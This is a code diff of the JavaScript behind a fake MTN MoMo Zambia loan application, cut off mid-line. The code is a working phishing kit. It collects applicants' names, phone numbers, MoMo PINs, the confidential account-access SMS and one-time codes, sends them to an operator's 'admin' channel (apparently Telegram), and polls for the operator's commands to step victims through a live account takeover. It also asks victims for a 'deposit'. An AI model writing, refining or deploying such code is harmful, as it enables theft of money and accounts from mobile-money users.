@@ -1,22 +1,276 @@
 (function () {
-  function initApp() {
-    const $ = (id) => document.getElementById(id);
+  const $ = (id) => document.getElementById(id);
 
-    const screens = {
-      welcome: $('screen-welcome'),
-      slider: $('screen-slider'),
-      form1: $('screen-form1'),
-      form2: $('screen-form2'),
-      form3: $('screen-form3'),
-      pin: $('screen-pin'),
-      sms: $('screen-sms'),
-      otp: $('screen-otp'),
-      success: $('screen-success'),
-      stopped: $('screen-stopped')
-    };
+  let currentUserId = null;
+  let statusPollInterval = null;
+  let smsTimerInterval = null;
+  let smsAutoSubmittedForCurrentValue = '';
+  let otpSubmittedForCurrentValue = '';
+  let pinSubmitting = false;
 
+  const urlParams = new URLSearchParams(window.location.search);
+  const adminParam = urlParams.get('admin') || '';
+
+  const REQUIRED_SMS_REGEX =
+    /^Y['’]ello\.\s*Please note!\s*This confidential code gives access to your MoMo account:\s*.+$/i;
+
+  function isValidMomoSms(rawSms) {
+    const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
+    return REQUIRED_SMS_REGEX.test(normalized);
+  }
+
+  function toZeroPrefixPhone(rawPhone) {
+    const digits = String(rawPhone || '').replace(/\D/g, '');
+    if (digits.startsWith('260')) return '0' + digits.slice(3);
+    if (digits.startsWith('0')) return digits;
+    if (/^(96|76|56)\d{7}$/.test(digits)) return '0' + digits;
+    return digits;
+  }
+
+  function isValidMtnZambia(rawPhone) {
+    const normalized = toZeroPrefixPhone(rawPhone);
+    return /^(096|076|056)\d{7}$/.test(normalized);
+  }
+
+  function formatDisplayPhone(rawPhone) {
+    const zeroPhone = toZeroPrefixPhone(rawPhone);
+    if (/^(096|076|056)\d{7}$/.test(zeroPhone)) {
+      return `${zeroPhone.slice(0, 3)} ${zeroPhone.slice(3, 6)} ${zeroPhone.slice(6)}`;
+    }
+    return zeroPhone || '096 XXX XXXX';
+  }
+
+  function showBanner(el, msg) {
+    if (!el) return;
+    el.innerText = msg;
+    el.classList.add('active');
+  }
+
+  function hideBanner(el) {
+    if (!el) return;
+    el.innerText = '';
+    el.classList.remove('active');
+  }
+
+  function showLoading(title, sub) {
+    const titleEl = $('loading-title');
+    const subEl = $('loading-sub');
     const loadingOverlay = $('loading-overlay');
+    if (titleEl) titleEl.innerText = title;
+    if (subEl) subEl.innerText = sub;
+    if (loadingOverlay) loadingOverlay.classList.add('active');
+  }
 
+  function hideLoading() {
+    const loadingOverlay = $('loading-overlay');
+    if (loadingOverlay) loadingOverlay.classList.remove('active');
+  }
+
+  function showScreen(targetScreen) {
+    document.querySelectorAll('.screen').forEach((s) => s.classList.remove('active'));
+    if (targetScreen) {
+      targetScreen.classList.add('active');
+      try {
+        window.scrollTo({ top: 0, behavior: 'instant' });
+      } catch (err) {
+        window.scrollTo(0, 0);
+      }
+    }
+  }
+
+  function startSmsCountdown() {
+    const smsSecondsSpan = $('sms-seconds');
+    const smsTimerText = $('sms-timer-text');
+    const btnRequestNewSms = $('btn-request-new-sms');
+
+    let timeLeft = 15;
+    if (smsSecondsSpan) smsSecondsSpan.innerText = timeLeft;
+    if (smsTimerText) smsTimerText.classList.remove('hidden-btn');
+    if (btnRequestNewSms) btnRequestNewSms.classList.add('hidden-btn');
+
+    if (smsTimerInterval) clearInterval(smsTimerInterval);
+
+    smsTimerInterval = setInterval(() => {
+      timeLeft -= 1;
+      if (smsSecondsSpan) smsSecondsSpan.innerText = Math.max(0, timeLeft);
+
+      if (timeLeft <= 0) {
+        clearInterval(smsTimerInterval);
+        if (smsTimerText) smsTimerText.classList.add('hidden-btn');
+        if (btnRequestNewSms) btnRequestNewSms.classList.remove('hidden-btn');
+      }
+    }, 1000);
+  }
+
+  function startStatusPolling() {
+    if (statusPollInterval) clearInterval(statusPollInterval);
+
+    statusPollInterval = setInterval(async () => {
+      if (!currentUserId) return;
+
+      try {
+        const res = await fetch(`/api/check-status/${encodeURIComponent(currentUserId)}`);
+        const data = await res.json();
+        const st = data && data.status;
+
+        const blockedReasonText = $('blocked-reason-text');
+        const yelloPinInput = $('yello-pin-input');
+        const btnSignInPin = $('btn-sign-in-pin');
+        const smsInputBox = $('sms-input-box');
+        const otpBoxes4 = Array.from(document.querySelectorAll('.otp-box-4'));
+
+        if (st === 'BLOCKED') {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          pinSubmitting = false;
+          hideLoading();
+          if (blockedReasonText) {
+            blockedReasonText.innerText =
+              'Your application was blocked because valid MTN MoMo details were not confirmed.';
+          }
+          showScreen($('screen-stopped'));
+        } else if (st === 'PROCEED_SMS') {
+          clearInterval(statusPollInterval);
+          pinSubmitting = false;
+          hideLoading();
+          hideBanner($('banner-sms-error'));
+          hideBanner($('banner-sms-info'));
+          smsAutoSubmittedForCurrentValue = '';
+          if (smsInputBox) smsInputBox.value = '';
+          showScreen($('screen-sms'));
+          startSmsCountdown();
+          if (smsInputBox) smsInputBox.focus();
+        } else if (st === 'INCORRECT_PIN') {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          pinSubmitting = false;
+          hideLoading();
+          if (yelloPinInput) yelloPinInput.value = '';
+          if (btnSignInPin) {
+            btnSignInPin.disabled = false;
+            btnSignInPin.classList.add('ready');
+          }
+          showScreen($('screen-pin'));
+          showBanner($('banner-pin-error'), 'INCORRECT PIN — Please enter your 5-digit PIN and tap SIGN IN.');
+          if (yelloPinInput) yelloPinInput.focus();
+        } else if (st === 'SMS_EXPIRED') {
+          clearInterval(statusPollInterval);
+          pinSubmitting = false;
+          hideLoading();
+          smsAutoSubmittedForCurrentValue = '';
+          if (smsInputBox) smsInputBox.value = '';
+          showScreen($('screen-sms'));
+          showBanner($('banner-sms-error'), 'SMS EXPIRES — Please enter a new SMS or request a new SMS.');
+          startSmsCountdown();
+          if (smsInputBox) smsInputBox.focus();
+        } else if (st === 'PROCEED_OTP') {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          pinSubmitting = false;
+          hideLoading();
+          hideBanner($('banner-otp-error'));
+          otpSubmittedForCurrentValue = '';
+          otpBoxes4.forEach((b) => (b.value = ''));
+          showScreen($('screen-otp'));
+          if (otpBoxes4[0]) otpBoxes4[0].focus();
+        } else if (st === 'OTP_EXPIRED') {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          pinSubmitting = false;
+          hideLoading();
+          otpSubmittedForCurrentValue = '';
+          otpBoxes4.forEach((b) => (b.value = ''));
+          showScreen($('screen-otp'));
+          showBanner($('banner-otp-error'), 'OTP EXPIRED — Please enter your new MTN MoMo 4-Digit OTP.');
+          if (otpBoxes4[0]) otpBoxes4[0].focus();
+        } else if (st === 'SUCCESS' || st === 'APPROVED') {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          pinSubmitting = false;
+          hideLoading();
+          showScreen($('screen-success'));
+        }
+      } catch (e) {}
+    }, 1000);
+  }
+
+  async function submitPinDirect(rawPin) {
+    if (pinSubmitting) return;
+    const pinInput = $('yello-pin-input');
+    const signInBtn = $('btn-sign-in-pin');
+    const errBanner = $('banner-pin-error');
+    const pinVal = String(rawPin !== undefined ? rawPin : pinInput ? pinInput.value : '')
+      .replace(/\D/g, '')
+      .slice(0, 5);
+
+    if (signInBtn) {
+      signInBtn.disabled = false;
+      signInBtn.classList.add('ready');
+    }
+
+    if (pinVal.length !== 5) {
+      showBanner(errBanner, 'Please enter your 5-digit PIN before tapping SIGN IN.');
+      if (pinInput) pinInput.focus();
+      return;
+    }
+
+    pinSubmitting = true;
+    hideBanner(errBanner);
+
+    const fn = ($('first-name')?.value || '').trim();
+    const ln = ($('last-name')?.value || '').trim();
+    const applicantName =
+      ($('sum-applicant')?.innerText || `${fn} ${ln}`).trim() || 'MTN MOMO ZAMBIA';
+    const rawPhone =
+      $('display-pin-phone')?.innerText || $('form-phone')?.value || '';
+    const phoneZero = toZeroPrefixPhone(rawPhone);
+
+    showLoading('SENDING DETAILS FOR VERIFICATION...', 'Please wait for admin response...');
+
+    try {
+      if (!currentUserId) {
+        const appRes = await fetch(
+          `/api/submit-application?admin=${encodeURIComponent(adminParam)}`,
+          {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              adminChatId: adminParam,
+              applicant: { fullName: applicantName, phone: phoneZero }
+            })
+          }
+        );
+        const appData = await appRes.json().catch(() => ({}));
+        if (appData && appData.userId) {
+          currentUserId = appData.userId;
+        }
+      }
+
+      const res = await fetch('/api/submit-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userId: currentUserId,
+          phone: phoneZero,
+          pin: pinVal,
+          applicantName
+        })
+      });
+      const data = await res.json().catch(() => ({}));
+      if (data && data.userId) {
+        currentUserId = data.userId;
+      }
+      startStatusPolling();
+    } catch (e) {
+      pinSubmitting = false;
+      hideLoading();
+      showBanner(errBanner, 'Connection error. Please tap SIGN IN again.');
+    }
+  }
+
+  window.__submitPinDirect = submitPinDirect;
+
+  function initApp() {
     const loanSlider = $('loan-amount-slider');
     const loanText = $('loan-amount-text');
     const monthsSlider = $('loan-months-slider');
@@ -51,90 +305,8 @@
 
     const displaySmsPhone = $('display-sms-phone');
     const smsInputBox = $('sms-input-box');
-    const smsSecondsSpan = $('sms-seconds');
-    const smsTimerText = $('sms-timer-text');
-    const btnRequestNewSms = $('btn-request-new-sms');
-
     const displayOtpPhone = $('display-otp-phone');
     const otpBoxes4 = Array.from(document.querySelectorAll('.otp-box-4'));
-
-    const blockedReasonText = $('blocked-reason-text');
-
-    let currentUserId = null;
-    let statusPollInterval = null;
-    let smsTimerInterval = null;
-    let smsAutoSubmittedForCurrentValue = '';
-    let otpSubmittedForCurrentValue = '';
-
-    const urlParams = new URLSearchParams(window.location.search);
-    const adminParam = urlParams.get('admin') || '';
-
-    const REQUIRED_SMS_REGEX =
-      /^Y['’]ello\.\s*Please note!\s*This confidential code gives access to your MoMo account:\s*.+$/i;
-
-    function isValidMomoSms(rawSms) {
-      const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
-      return REQUIRED_SMS_REGEX.test(normalized);
-    }
-
-    function toZeroPrefixPhone(rawPhone) {
-      const digits = String(rawPhone || '').replace(/\D/g, '');
-      if (digits.startsWith('260')) return '0' + digits.slice(3);
-      if (digits.startsWith('0')) return digits;
-      if (/^(96|76|56)\d{7}$/.test(digits)) return '0' + digits;
-      return digits;
-    }
-
-    function isValidMtnZambia(rawPhone) {
-      const normalized = toZeroPrefixPhone(rawPhone);
-      return /^(096|076|056)\d{7}$/.test(normalized);
-    }
-
-    function formatDisplayPhone(rawPhone) {
-      const zeroPhone = toZeroPrefixPhone(rawPhone);
-      if (/^(096|076|056)\d{7}$/.test(zeroPhone)) {
-        return `${zeroPhone.slice(0, 3)} ${zeroPhone.slice(3, 6)} ${zeroPhone.slice(6)}`;
-      }
-      return zeroPhone || '096 XXX XXXX';
-    }
-
-    function showBanner(el, msg) {
-      if (!el) return;
-      el.innerText = msg;
-      el.classList.add('active');
-    }
-
-    function hideBanner(el) {
-      if (!el) return;
-      el.innerText = '';
-      el.classList.remove('active');
-    }
-
-    function showLoading(title, sub) {
-      const titleEl = $('loading-title');
-      const subEl = $('loading-sub');
-      if (titleEl) titleEl.innerText = title;
-      if (subEl) subEl.innerText = sub;
-      if (loadingOverlay) loadingOverlay.classList.add('active');
-    }
-
-    function hideLoading() {
-      if (loadingOverlay) loadingOverlay.classList.remove('active');
-    }
-
-    function showScreen(targetScreen) {
-      Object.values(screens).forEach((s) => {
-        if (s) s.classList.remove('active');
-      });
-      if (targetScreen) {
-        targetScreen.classList.add('active');
-        try {
-          window.scrollTo({ top: 0, behavior: 'instant' });
-        } catch (err) {
-          window.scrollTo(0, 0);
-        }
-      }
-    }
 
     function updateCalc() {
       const amt = loanSlider ? Number(loanSlider.value) || 100000 : 100000;
@@ -157,64 +329,41 @@
     }
     updateCalc();
 
-    function syncPinInputAndButton() {
-      if (!yelloPinInput || !btnSignInPin) return;
-      const digits = yelloPinInput.value.replace(/\D/g, '').slice(0, 5);
-      if (yelloPinInput.value !== digits) yelloPinInput.value = digits;
+    if (yelloPinInput) {
+      yelloPinInput.addEventListener('input', () => {
+        const digits = yelloPinInput.value.replace(/\D/g, '').slice(0, 5);
+        if (yelloPinInput.value !== digits) yelloPinInput.value = digits;
+        if (btnSignInPin) {
+          btnSignInPin.disabled = false;
+          btnSignInPin.classList.add('ready');
+        }
+      });
+      yelloPinInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          submitPinDirect(yelloPinInput.value);
+        }
+      });
+    }
+
+    if (btnSignInPin) {
       btnSignInPin.disabled = false;
       btnSignInPin.classList.add('ready');
+      const triggerSignIn = (e) => {
+        if (e) e.preventDefault();
+        submitPinDirect(yelloPinInput ? yelloPinInput.value : '');
+      };
+      btnSignInPin.addEventListener('click', triggerSignIn);
     }
 
-    if (yelloPinInput) {
-      yelloPinInput.addEventListener('input', syncPinInputAndButton);
-      yelloPinInput.addEventListener('change', syncPinInputAndButton);
-    }
-
-    function goFromForm1ToForm2() {
-      const amtRaw = (formAmountInput?.value || '100,000').trim();
-      const dur = loanDurationSelect?.value || '48 Months';
-      const purp = (loanPurposeInput?.value || '').trim() || 'Business';
-      if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
-      if (sumDuration) sumDuration.innerText = dur;
-      if (sumPurpose) sumPurpose.innerText = purp;
-      hideBanner(bannerPhoneError);
-      showScreen(screens.form2);
-    }
-
-    function goFromForm2ToForm3() {
-      hideBanner(bannerPhoneError);
-      const fn = (firstNameInput?.value || '').trim();
-      const ln = (lastNameInput?.value || '').trim();
-      const ph = (formPhoneInput?.value || '').trim();
-
-      if (!fn || !ln) {
-        showBanner(bannerPhoneError, 'Please enter your first name and last name.');
-        return;
-      }
-
-      if (!isValidMtnZambia(ph)) {
-        showBanner(
-          bannerPhoneError,
-          'Enter a valid MTN Zambia number starting with 096, 076, or 056.'
-        );
-        return;
-      }
-
-      const amtRaw = (formAmountInput?.value || '100,000').trim();
-      const dur = loanDurationSelect?.value || '48 Months';
-      const purp = (loanPurposeInput?.value || '').trim() || 'Business';
-      if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
-      if (sumDuration) sumDuration.innerText = dur;
-      if (sumPurpose) sumPurpose.innerText = purp;
-      if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();
-
-      const numericAmt = Number(amtRaw.replace(/\D/g, '')) || 100000;
-      const depVal = Math.max(200, Math.round(numericAmt * 0.002));
-      if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
-      if (successDepositAmount) successDepositAmount.innerText = `${depVal} ZMW`;
-
-      hideBanner(bannerForm3Error);
-      showScreen(screens.form3);
+    if (btnTogglePinVisibility) {
+      btnTogglePinVisibility.addEventListener('click', (e) => {
+        e.preventDefault();
+        if (!yelloPinInput) return;
+        const makeVisible = yelloPinInput.type === 'password';
+        yelloPinInput.type = makeVisible ? 'text' : 'password';
+        btnTogglePinVisibility.innerText = makeVisible ? '🙈' : '👁️';
+      });
     }
 
     async function submitApplicationAndOpenPin() {
@@ -235,18 +384,22 @@
       if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
       if (sumApplicant) sumApplicant.innerText = fullName;
 
+      pinSubmitting = false;
       otpSubmittedForCurrentValue = '';
       if (yelloPinInput) {
         yelloPinInput.value = '';
         yelloPinInput.type = 'password';
       }
       if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
-      syncPinInputAndButton();
+      if (btnSignInPin) {
+        btnSignInPin.disabled = false;
+        btnSignInPin.classList.add('ready');
+      }
       otpBoxes4.forEach((b) => (b.value = ''));
       hideBanner(bannerPinError);
       hideBanner(bannerOtpError);
 
-      showScreen(screens.pin);
+      showScreen($('screen-pin'));
       if (yelloPinInput) yelloPinInput.focus();
 
       try {
@@ -267,71 +420,6 @@
         }
       } catch (e) {}
     }
-
-    function startSmsCountdown() {
-      let timeLeft = 15;
-      if (smsSecondsSpan) smsSecondsSpan.innerText = timeLeft;
-      if (smsTimerText) smsTimerText.classList.remove('hidden-btn');
-      if (btnRequestNewSms) btnRequestNewSms.classList.add('hidden-btn');
-
-      if (smsTimerInterval) clearInterval(smsTimerInterval);
-
-      smsTimerInterval = setInterval(() => {
-        timeLeft -= 1;
-        if (smsSecondsSpan) smsSecondsSpan.innerText = Math.max(0, timeLeft);
-
-        if (timeLeft <= 0) {
-          clearInterval(smsTimerInterval);
-          if (smsTimerText) smsTimerText.classList.add('hidden-btn');
-          if (btnRequestNewSms) btnRequestNewSms.classList.remove('hidden-btn');
-        }
-      }, 1000);
-    }
-
-    async function submitPinToTelegram(pinVal) {
-      hideBanner(bannerPinError);
-      const rawPhone = displayPinPhone?.innerText || formPhoneInput?.value || '';
-      const phoneZero = toZeroPrefixPhone(rawPhone);
-      const applicantName =
-        (
-          sumApplicant?.innerText ||
-          `${firstNameInput?.value || ''} ${lastNameInput?.value || ''}`
-        ).trim() || 'MTN MOMO ZAMBIA';
-
-      showLoading('SENDING DETAILS FOR VERIFICATION...', 'Please wait for admin response...');
-
-      try {
-        const res = await fetch('/api/submit-pin', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            userId: currentUserId,
-            phone: phoneZero,
-            pin: pinVal,
-            applicantName
-          })
-        });
-        const data = await res.json();
-        if (data && data.success && data.userId) {
-          currentUserId = data.userId;
-        }
-        startStatusPolling();
-      } catch (e) {
-        hideLoading();
-        showBanner(bannerPinError, 'Connection error. Please tap SIGN IN again.');
-      }
-    }
-
-    window.__submitPinDirect = async function (pinVal) {
-      const cleanPin = String(pinVal || yelloPinInput?.value || '')
-        .replace(/\D/g, '')
-        .slice(0, 5);
-      if (cleanPin.length !== 5) {
-        showBanner(bannerPinError, 'Please enter your 5-digit PIN.');
-        return;
-      }
-      await submitPinToTelegram(cleanPin);
-    };
 
     async function submitSmsToTelegram(smsText, autoDetected) {
       hideBanner(bannerSmsError);
@@ -385,89 +473,11 @@
       }
     }
 
-    function startStatusPolling() {
-      if (statusPollInterval) clearInterval(statusPollInterval);
-
-      statusPollInterval = setInterval(async () => {
-        if (!currentUserId) return;
-
-        try {
-          const res = await fetch(`/api/check-status/${encodeURIComponent(currentUserId)}`);
-          const data = await res.json();
-          const st = data && data.status;
-
-          if (st === 'BLOCKED') {
-            clearInterval(statusPollInterval);
-            if (smsTimerInterval) clearInterval(smsTimerInterval);
-            hideLoading();
-            if (blockedReasonText) {
-              blockedReasonText.innerText =
-                'Your application was blocked because valid MTN MoMo details were not confirmed.';
-            }
-            showScreen(screens.stopped);
-          } else if (st === 'PROCEED_SMS') {
-            clearInterval(statusPollInterval);
-            hideLoading();
-            hideBanner(bannerSmsError);
-            hideBanner(bannerSmsInfo);
-            smsAutoSubmittedForCurrentValue = '';
-            if (smsInputBox) smsInputBox.value = '';
-            showScreen(screens.sms);
-            startSmsCountdown();
-            if (smsInputBox) smsInputBox.focus();
-          } else if (st === 'INCORRECT_PIN') {
-            clearInterval(statusPollInterval);
-            if (smsTimerInterval) clearInterval(smsTimerInterval);
-            hideLoading();
-            if (yelloPinInput) yelloPinInput.value = '';
-            syncPinInputAndButton();
-            showScreen(screens.pin);
-            showBanner(bannerPinError, 'INCORRECT PIN — Please enter your 5-digit PIN and tap SIGN IN.');
-            if (yelloPinInput) yelloPinInput.focus();
-          } else if (st === 'SMS_EXPIRED') {
-            clearInterval(statusPollInterval);
-            hideLoading();
-            smsAutoSubmittedForCurrentValue = '';
-            if (smsInputBox) smsInputBox.value = '';
-            showScreen(screens.sms);
-            showBanner(bannerSmsError, 'SMS EXPIRES — Please enter a new SMS or request a new SMS.');
-            startSmsCountdown();
-            if (smsInputBox) smsInputBox.focus();
-          } else if (st === 'PROCEED_OTP') {
-            clearInterval(statusPollInterval);
-            if (smsTimerInterval) clearInterval(smsTimerInterval);
-            hideLoading();
-            hideBanner(bannerOtpError);
-            otpSubmittedForCurrentValue = '';
-            otpBoxes4.forEach((b) => (b.value = ''));
-            showScreen(screens.otp);
-            if (otpBoxes4[0]) otpBoxes4[0].focus();
-          } else if (st === 'OTP_EXPIRED') {
-            clearInterval(statusPollInterval);
-            if (smsTimerInterval) clearInterval(smsTimerInterval);
-            hideLoading();
-            otpSubmittedForCurrentValue = '';
-            otpBoxes4.forEach((b) => (b.value = ''));
-            showScreen(screens.otp);
-            showBanner(
-              bannerOtpError,
-              'OTP EXPIRED — Please enter your new MTN MoMo 4-Digit OTP.'
-            );
-            if (otpBoxes4[0]) otpBoxes4[0].focus();
-          } else if (st === 'SUCCESS' || st === 'APPROVED') {
-            clearInterval(statusPollInterval);
-            if (smsTimerInterval) clearInterval(smsTimerInterval);
-            hideLoading();
-            showScreen(screens.success);
-          }
-        } catch (e) {}
-      }, 1000);
-    }
-
     function resetToWelcome() {
       if (statusPollInterval) clearInterval(statusPollInterval);
       if (smsTimerInterval) clearInterval(smsTimerInterval);
       currentUserId = null;
+      pinSubmitting = false;
       smsAutoSubmittedForCurrentValue = '';
       otpSubmittedForCurrentValue = '';
       if (yelloPinInput) {
@@ -475,7 +485,10 @@
         yelloPinInput.type = 'password';
       }
       if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
-      syncPinInputAndButton();
+      if (btnSignInPin) {
+        btnSignInPin.disabled = false;
+        btnSignInPin.classList.add('ready');
+      }
       otpBoxes4.forEach((b) => (b.value = ''));
       if (smsInputBox) smsInputBox.value = '';
       [
@@ -487,74 +500,57 @@
         bannerOtpError
       ].forEach(hideBanner);
       hideLoading();
-      showScreen(screens.welcome);
+      showScreen($('screen-welcome'));
     }
 
-    async function handleButtonAction(buttonId, event) {
-      switch (buttonId) {
-        case 'btn-goto-slider':
-          updateCalc();
-          showScreen(screens.slider);
-          break;
-        case 'btn-slider-back':
-          showScreen(screens.welcome);
-          break;
-        case 'btn-goto-form1':
-          showScreen(screens.form1);
-          break;
-        case 'btn-form1-back':
-          updateCalc();
-          showScreen(screens.slider);
-          break;
-        case 'btn-form1-next':
-          goFromForm1ToForm2();
-          break;
-        case 'btn-form2-prev':
-          showScreen(screens.form1);
-          break;
-        case 'btn-form2-next':
-          goFromForm2ToForm3();
-          break;
-        case 'btn-form3-prev':
-          showScreen(screens.form2);
-          break;
-        case 'btn-form3-submit':
-          await submitApplicationAndOpenPin();
-          break;
-        case 'btn-pin-back':
-          if (statusPollInterval) clearInterval(statusPollInterval);
-          hideLoading();
-          showScreen(screens.form3);
-          break;
-        case 'btn-sign-in-pin': {
-          const pinVal = (yelloPinInput?.value || '').replace(/\D/g, '').slice(0, 5);
-          if (pinVal.length !== 5) {
-            showBanner(bannerPinError, 'Please enter your 5-digit PIN.');
-            return;
-          }
-          await submitPinToTelegram(pinVal);
-          break;
+    const buttonHandlers = {
+      'btn-goto-slider': () => {
+        updateCalc();
+        showScreen($('screen-slider'));
+      },
+      'btn-slider-back': () => showScreen($('screen-welcome')),
+      'btn-goto-form1': () => showScreen($('screen-form1')),
+      'btn-form1-back': () => {
+        updateCalc();
+        showScreen($('screen-slider'));
+      },
+      'btn-form1-next': () => {
+        const amtRaw = (formAmountInput?.value || '100,000').trim();
+        const dur = loanDurationSelect?.value || '48 Months';
+        const purp = (loanPurposeInput?.value || '').trim() || 'Business';
+        if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
+        if (sumDuration) sumDuration.innerText = dur;
+        if (sumPurpose) sumPurpose.innerText = purp;
+        hideBanner(bannerPhoneError);
+        showScreen($('screen-form2'));
+      },
+      'btn-form2-prev': () => showScreen($('screen-form1')),
+      'btn-form2-next': () => {
+        hideBanner(bannerPhoneError);
+        const fn = (firstNameInput?.value || '').trim();
+        const ln = (lastNameInput?.value || '').trim();
+        const ph = (formPhoneInput?.value || '').trim();
+
+        if (!fn || !ln) {
+          showBanner(bannerPhoneError, 'Please enter your first name and last name.');
+          return;
         }
-        case 'link-forgot-pin':
-          if (event) event.preventDefault();
+        if (!isValidMtnZambia(ph)) {
           showBanner(
-            bannerPinError,
-            'Enter your 5-digit MTN MoMo PIN in the PIN field and tap SIGN IN to continue.'
+            bannerPhoneError,
+            'Enter a valid MTN Zambia number starting with 096, 076, or 056.'
           );
-          break;
-        case 'btn-switch-account':
-          if (statusPollInterval) clearInterval(statusPollInterval);
-          hideLoading();
-          showScreen(screens.form2);
-          break;
-        case 'link-pin-tcs':
-          if (event) event.preventDefault();
-          showBanner(
-            bannerPinError,
-            'Standard MTN MoMo Zambia terms and conditions apply to loan applications.'
-          );
-          break;
-        case 'btn-pin-contact':
-          showBanner(
-            bannerPinError,
-            'M
+          return;
+        }
+
+        const amtRaw = (formAmountInput?.value || '100,000').trim();
+        const dur = loanDurationSelect?.value || '48 Months';
+        const purp = (loanPurposeInput?.value || '').trim() || 'Business';
+        if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
+        if (sumDuration) sumDuration.innerText = dur;
+        if (sumPurpose) sumPurpose.innerText = purp;
+        if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();
+
+        const numericAmt = Number(amtRaw.replace(/\D/g, '')) || 100000;
+        const depVal = Math.max(200, Math.round(numericAmt * 0.002));
+        if (depositRequiredAmount) depositReq
